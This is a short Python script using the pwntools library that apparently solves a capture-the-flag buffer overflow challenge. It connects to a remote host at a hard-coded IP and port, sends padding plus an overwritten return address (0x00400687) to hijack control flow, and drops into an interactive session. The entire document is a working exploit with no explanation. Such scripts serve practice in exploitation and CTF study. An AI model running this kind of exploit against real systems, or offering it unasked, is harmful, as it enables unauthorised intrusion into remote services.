#!/usr/bin/env python
from pwn import *
import pwnlib.elf

c = remote('60.250.197.227', 10000)
#c = process('./bof-767fdf896cf9838c0294db24eaa1271ebf15a6e638a873e94ab9682ef28464b4')
e = ELF('./bof-767fdf896cf9838c0294db24eaa1271ebf15a6e638a873e94ab9682ef28464b4')

context.terminal = ['alacritty', '-e', 'sh', '-c']
#gdb.attach(c)

ans = b'a' *(48 + 8 - 8 ) + p64(0x00400687)

c.sendline(ans)

c.interactive()
#c.close()
